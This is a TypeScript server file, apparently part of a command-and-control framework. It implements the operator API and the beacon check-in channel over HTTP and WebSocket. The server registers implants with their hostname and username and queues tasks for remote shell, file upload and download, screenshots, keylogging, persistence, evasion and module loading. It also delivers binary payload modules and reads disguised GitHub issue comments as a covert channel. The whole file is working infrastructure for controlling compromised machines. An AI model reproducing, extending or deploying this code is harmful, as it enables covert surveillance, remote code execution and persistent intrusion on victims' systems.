// server/src/http/DashboardHttpServer.ts
import type { Octokit } from '@octokit/rest';
import type { BeaconRegistry } from '../BeaconRegistry.ts';
import type { TaskQueue, TaskKind, QueuedTask } from '../TaskQueue.ts';
import type { ModuleStore } from './ModuleStore.ts';
import { OidcRoutes } from './OidcRoutes.ts';

interface GitHubConfig {
  octokit: Octokit;
  owner:   string;
  repo:    string;
}

interface CheckinPayload {
  beaconId:  string;
  publicKey: string;
  hostname:  string;
  username:  string;
  os:        string;
  arch:      string;
  pid:       number;
  checkinAt: string;
}

interface TaskResultPayload {
  taskId:      string;
  beaconId:    string;
  success:     boolean;
  output:      string;
  data?:       string;
  completedAt: string;
  signature?:  string;
}

interface Task {
  taskId:           string;
  kind:             string;
  args:             Record<string, unknown>;
  ref?:             string;
  issuedAt?:        string;
  preferredChannel?: string;
}

const VALID_KINDS = new Set<TaskKind>([
  'shell', 'upload', 'download', 'screenshot', 'keylog',
  'persist', 'unpersist', 'sleep', 'die', 'load-module', 'ping', 'evasion',
]);

const STATUS_MAP: Record<string, 'active' | 'stale' | 'dead'> = {
  active:  'active',
  dormant: 'stale',
  lost:    'dead',
};

export class DashboardHttpServer {
  private server: ReturnType<typeof Bun.serve> | null = null;
  private readonly oidcRoutes: OidcRoutes | null;

  constructor(
    private readonly registry: BeaconRegistry,
    private readonly queue: TaskQueue,
    private readonly token: string,
    private readonly moduleStore: ModuleStore,
    private readonly githubConfig?: GitHubConfig,
    operatorSecretKey?: Uint8Array,
  ) {
    this.oidcRoutes = operatorSecretKey
      ? new OidcRoutes({ registry, taskQueue: queue, operatorSecretKey })
      : null;
  }

  /** Starts the server. Pass port=0 to let the OS pick a free port. */
  start(port: number): number {
    this.server = Bun.serve({
      port,
      idleTimeout: 0, // disable — SSE streams and WS connections must not time out
      fetch: (req, server) => this.handle(req, server),
      websocket: {
        open:    (ws) => this.wsOpen(ws),
        message: (ws, msg) => this.wsMessage(ws, msg),
        close:   (ws) => this.wsClose(ws),
      },
    });
    console.log(`[HTTP] Dashboard API listening on port ${this.server.port}`);
    return this.server.port ?? 0;
  }

  stop(): void {
    this.server?.stop(true);
    this.server = null;
  }

  private cors(): Record<string, string> {
    return {
      // Phase 2: wildcard CORS acceptable (server is localhost/Codespaces only).
      // Phase 3: tighten to specific dashboard origin via OCTOC2_DASHBOARD_ORIGIN.
      'Access-Control-Allow-Origin':  '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Authorization, Content-Type',
    };
  }

  private json(data: unknown, status = 200): Response {
    return new Response(JSON.stringify(data), {
      status,
      headers: { 'Content-Type': 'application/json', ...this.cors() },
    });
  }

  private err(message: string, status: number): Response {
    return this.json({ error: message }, status);
  }

  private async handle(req: Request, server: Bun.Server<unknown>): Promise<Response> {
    try {
      const { pathname } = new URL(req.url);

      if (req.method === 'OPTIONS') {
        return new Response(null, { status: 204, headers: this.cors() });
      }

      if (req.method === 'GET' && pathname === '/api/health') {
        return this.json({ ok: true, serverTime: new Date().toISOString() });
      }

      // WebSocket upgrade for beacon channel
      if (req.method === 'GET' && pathname === '/ws') {
        const url      = new URL(req.url);
        const wsToken  = url.searchParams.get('token') ?? '';
        if (wsToken !== this.token) {
          return this.err('unauthorized', 401);
        }
        const upgraded = (server as Bun.Server<undefined>).upgrade(req);
        if (upgraded) return undefined as unknown as Response;
        return this.err('WebSocket upgrade failed', 400);
      }

      // OIDC routes use JWT auth — bypass the Bearer token check
      if (this.oidcRoutes && pathname.startsWith('/api/oidc/')) {
        const oidcResp = await this.oidcRoutes.handle(req, pathname);
        if (oidcResp) return oidcResp;
      }

      const auth = req.headers.get('Authorization') ?? '';
      if (!auth.startsWith('Bearer ') || auth.slice(7) !== this.token) {
        return this.err('unauthorized', 401);
      }

      return this.route(req, pathname);
    } catch (err) {
      console.error('[HTTP] Unhandled error:', err);
      return this.err('internal server error', 500);
    }
  }

  private async route(req: Request, pathname: string): Promise<Response> {
    if (req.method === 'GET' && pathname === '/api/beacons') {
      return this.getBeacons();
    }

    const taskMatch = pathname.match(/^\/api\/beacon\/([^/]+)\/task$/);
    if (req.method === 'POST' && taskMatch) {
      return this.postTask(req, taskMatch[1]!);
    }

    const resultsMatch = pathname.match(/^\/api\/beacon\/([^/]+)\/results$/);
    if (req.method === 'GET' && resultsMatch) {
      return this.getResults(resultsMatch[1]!);
    }

    const moduleMatch = pathname.match(/^\/api\/modules\/([^/]+)\/([^/]+)$/);
    if (moduleMatch) {
      const [, beaconId, name] = moduleMatch as [string, string, string];
      if (req.method === 'POST') {
        return this.handleModuleUpload(req, beaconId, name);
      }
      if (req.method === 'GET') {
        return this.handleModuleDownload(beaconId, name);
      }
    }

    const moduleListMatch = pathname.match(/^\/api\/beacon\/([^/]+)\/modules$/);
    if (req.method === 'GET' && moduleListMatch) {
      return this.getModuleList(moduleListMatch[1]!);
    }

    const maintenanceMatch = pathname.match(/^\/api\/beacon\/([^/]+)\/maintenance$/);
    if (req.method === 'GET' && maintenanceMatch) {
      return this.getMaintenance(maintenanceMatch[1]!);
    }

    if (req.method === 'GET' && pathname === '/api/events') {
      return this.getEvents();
    }

    if (req.method === 'POST' && pathname === '/api/beacon/checkin') {
      return this.beaconCheckin(req);
    }

    if (req.method === 'POST' && pathname === '/api/beacon/submit-result') {
      return this.beaconSubmitResult(req);
    }

    return this.err('not found', 404);
  }

  // ── WebSocket lifecycle ─────────────────────────────────────────────────────

  private wsOpen(_ws: Bun.ServerWebSocket<unknown>): void {
    // nothing needed on open
  }

  private async wsMessage(
    ws: Bun.ServerWebSocket<unknown>,
    msg: string | Buffer,
  ): Promise<void> {
    try {
      const text   = typeof msg === 'string' ? msg : msg.toString('utf8');
      const parsed = JSON.parse(text) as { type: string; payload?: unknown; result?: unknown };

      if (parsed.type === 'checkin') {
        const tasks = await this.handleCheckinPayload(parsed.payload as CheckinPayload);
        ws.send(JSON.stringify({ type: 'checkin-response', tasks }));
      } else if (parsed.type === 'submit-result') {
        await this.handleSubmitResult(parsed.result as TaskResultPayload);
        ws.send(JSON.stringify({ type: 'result-accepted' }));
      } else {
        ws.send(JSON.stringify({ type: 'error', message: 'unknown message type' }));
      }
    } catch (err) {
      ws.send(JSON.stringify({ type: 'error', message: (err as Error).message }));
    }
  }

  private wsClose(_ws: Bun.ServerWebSocket<unknown>): void {
    // nothing needed on close
  }

  // ── Shared beacon business logic ────────────────────────────────────────────

  private async handleCheckinPayload(payload: CheckinPayload): Promise<Task[]> {
    // Upsert beacon: if known, update lastSeen; otherwise register with issueNumber 0
    const existing = this.registry.get(payload.beaconId);
    if (existing) {
      this.registry.updateLastSeen(payload.beaconId, existing.lastSeq);
    } else {
      this.registry.register({
        beaconId:    payload.beaconId,
        issueNumber: 0,
        publicKey:   payload.publicKey,
        hostname:    payload.hostname,
        username:    payload.username,
        os:          payload.os,
        arch:        payload.arch,
        seq:         0,
        tentacleId:  13,  // T13 — HTTP/WebSocket direct channel
      });
    }
    // Always track that this checkin arrived via the HTTP/WebSocket channel
    this.registry.updateActiveTentacle(payload.beaconId, 13);

    // Get pending tasks and mark them delivered
    const pending = this.queue.getPendingTasks(payload.beaconId);
    for (const task of pending) {
      this.queue.markDelivered(task.taskId);
    }

    // Return task shape expected by the beacon
    return pending.map((t: QueuedTask): Task => ({
      taskId:           t.taskId,
      kind:             t.kind,
      args:             t.args,
      ref:              t.ref,
      issuedAt:         t.createdAt,
      ...(t.preferredChannel !== undefined && { preferredChannel: t.preferredChannel }),
    }));
  }

  private async handleSubmitResult(result: TaskResultPayload): Promise<void> {
    const resultJson = JSON.stringify({
      success:     result.success,
      output:      result.output,
      data:        result.data ?? '',
      completedAt: result.completedAt,
      signature:   result.signature ?? '',
    });
    this.queue.markCompleted(result.taskId, resultJson);
  }

  private async beaconCheckin(req: Request): Promise<Response> {
    let payload: CheckinPayload;
    try {
      payload = await req.json() as CheckinPayload;
    } catch {
      return this.err('invalid JSON', 400);
    }
    const tasks = await this.handleCheckinPayload(payload);
    return this.json({ tasks });
  }

  private async beaconSubmitResult(req: Request): Promise<Response> {
    let result: TaskResultPayload;
    try {
      result = await req.json() as TaskResultPayload;
    } catch {
      return this.err('invalid JSON', 400);
    }
    await this.handleSubmitResult(result);
    return this.json({ accepted: true });
  }

  // ── Operator REST handlers ───────────────────────────────────────────────────

  private getBeacons(): Response {
    const beacons = this.registry.getAll().map(r => ({
      id:             r.beaconId,
      hostname:       r.hostname,
      os:             r.os,
      arch:           r.arch,
      status:         STATUS_MAP[r.status] ?? 'stale',
      lastSeen:       r.lastSeen,
      activeTentacle: r.activeTentacle ?? 1,
      issueNumber:    r.issueNumber,
      publicKey:      r.publicKey,
      username:       r.username,
    }));
    return this.json(beacons);
  }

  private async postTask(req: Request, beaconId: string): Promise<Response> {
    if (!this.registry.get(beaconId)) {
      return this.err('beacon not found', 404);
    }

    let body: { kind?: unknown; args?: unknown; preferredChannel?: unknown };
    try {
      body = await req.json() as { kind?: unknown; args?: unknown; preferredChannel?: unknown };
    } catch {
      return this.err('invalid JSON body', 400);
    }

    if (!body.kind || !VALID_KINDS.has(body.kind as TaskKind)) {
      return this.err(`kind must be one of: ${[...VALID_KINDS].join(', ')}`, 400);
    }
    if (!body.args || typeof body.args !== 'object' || Array.isArray(body.args)) {
      return this.err('args must be an object', 400);
    }

    const preferredChannel = typeof body.preferredChannel === 'string'
      ? body.preferredChannel
      : undefined;

    const task = this.queue.queueTask(
      beaconId,
      body.kind as TaskKind,
      body.args as Record<string, unknown>,
      preferredChannel,
    );
    return this.json({
      taskId:           task.taskId,
      beaconId:         task.beaconId,
      kind:             task.kind,
      args:             task.args,
      status:           task.state,
      createdAt:        task.createdAt,
      preferredChannel: task.preferredChannel,
    }, 201);
  }

  private getResults(beaconId: string): Response {
    const tasks = this.queue.getAllTasks(beaconId)
      .sort((a, b) =>
        new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
      )
      .map(t => ({
        taskId:      t.taskId,
        beaconId:    t.beaconId,
        kind:        t.kind,
        args:        t.args,
        status:      t.state,
        ref:         t.ref,
        createdAt:   t.createdAt,
        deliveredAt: t.deliveredAt,
        completedAt: t.completedAt,
        result:      t.result ? (() => { try { return JSON.parse(t.result!) as unknown; } catch { return t.result; } })() : null,
      }));
    return this.json(tasks);
  }

  private async getModuleList(beaconId: string): Promise<Response> {
    const names    = await this.moduleStore.list(beaconId);
    const allTasks = this.queue.getAllTasks(beaconId);

    const result = names.map(name => {
      const lastTask = allTasks
        .filter(t =>
          t.kind === 'load-module' &&
          (t.args as Record<string, unknown>)['name'] === name &&
          t.state === 'completed' &&
          t.completedAt !== null
        )
        .sort((a, b) =>
          new Date(b.completedAt!).getTime() - new Date(a.completedAt!).getTime()
        )[0];

      return { name, lastExecuted: lastTask?.completedAt ?? null };
    });

    return this.json(result);
  }

  private async getMaintenance(beaconId: string): Promise<Response> {
    const record = this.registry.get(beaconId);
    if (!record) return this.err('beacon not found', 404);

    const allTasks  = this.queue.getAllTasks(beaconId);
    const taskCount = allTasks.length;
    const completed = allTasks.filter(t => t.state === 'completed');
    const failed    = allTasks.filter(t => t.state === 'failed');
    const pending   = allTasks.filter(t => t.state === 'pending' || t.state === 'delivered');

    const tasks = allTasks
      .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime())
      .slice(0, 50)
      .map(t => ({
        taskId:      t.taskId,
        kind:        t.kind,
        status:      t.state,
        ref:         t.ref,
        createdAt:   t.createdAt,
        completedAt: t.completedAt,
      }));

    let commentBody: string | null = null;
    if (this.githubConfig && record.issueNumber) {
      try {
        const { octokit, owner, repo } = this.githubConfig;
        const comments = await octokit.paginate(
          octokit.issues.listComments,
          { owner, repo, issue_number: record.issueNumber, per_page: 100 },
        );
        const match = comments.find(c => c.body?.includes('<!-- infra-maintenance:'));
        commentBody = match?.body ?? null;
      } catch {
        commentBody = null;
      }
    }

    return this.json({
      beaconId:       record.beaconId,
      hostname:       record.hostname,
      os:             record.os,
      arch:           record.arch,
      status:         STATUS_MAP[record.status] ?? 'stale',
      lastSeen:       record.lastSeen,
      taskCount,
      completedCount: completed.length,
      failedCount:    failed.length,
      pendingCount:   pending.length,
      tasks,
      commentBody,
    });
  }

  private async handleModuleUpload(
    req: Request,
    beaconId: string,
    name: string,
  ): Promise<Response> {
    const MODULE_NAME_RE = /^[a-zA-Z0-9_-]{1,64}$/;
    if (!MODULE_NAME_RE.test(name)) {
      return this.err('invalid module name', 400);
    }

    if (!this.registry.get(beaconId)) {
      return this.err('beacon not found', 404);
    }

    const bytes = new Uint8Array(await req.arrayBuffer());
    if (bytes.length === 0) {
      return this.err('empty body', 400);
    }

    await this.moduleStore.store(beaconId, name, bytes);
    return this.json({ beaconId, name, bytes: bytes.length }, 201);
  }

  private getEvents(): Response {
    let intervalId: ReturnType<typeof setInterval> | null = null;
    const registry = this.registry;
    const enc      = new TextEncoder();

    const mapBeacons = () =>
      registry.getAll().map(r => ({
        id:             r.beaconId,
        hostname:       r.hostname,
        os:             r.os,
        arch:           r.arch,
        status:         STATUS_MAP[r.status] ?? 'stale',
        lastSeen:       r.lastSeen,
        activeTentacle: r.activeTentacle ?? 1,
        issueNumber:    r.issueNumber,
        publicKey:      r.publicKey,
        username:       r.username,
      }));

    const stream = new ReadableStream({
      start(controller) {
        const push = () => {
          const line = `data: ${JSON.stringify({ type: 'beacon-update', beacons: mapBeacons() })}\n\n`;
          try { controller.enqueue(enc.encode(line)); } catch { /* client disconnected */ }
        };
        push();
        intervalId = setInterval(push, 10_000);
      },
      cancel() {
        if (intervalId !== null) {
          clearInterval(intervalId);
          intervalId = null;
        }
      },
    });

    return new Response(stream, {
      headers: {
        'Content-Type':  'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection':    'keep-alive',
        ...this.cors(),
      },
    });
  }

  private async handleModuleDownload(beaconId: string, name: string): Promise<Response> {
    const MODULE_NAME_RE = /^[a-zA-Z0-9_-]{1,64}$/;
    if (!MODULE_NAME_RE.test(name)) {
      return this.err('invalid module name', 400);
    }

    const data = await this.moduleStore.fetch(beaconId, name);
    if (!data) {
      return this.err('module not found', 404);
    }

    return new Response(data, {
      status: 200,
      headers: {
        'Content-Type':                'application/octet-stream',
        'Content-Length':              String(data.length),
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Authorization, Content-Type',
      },
    });
  }
}
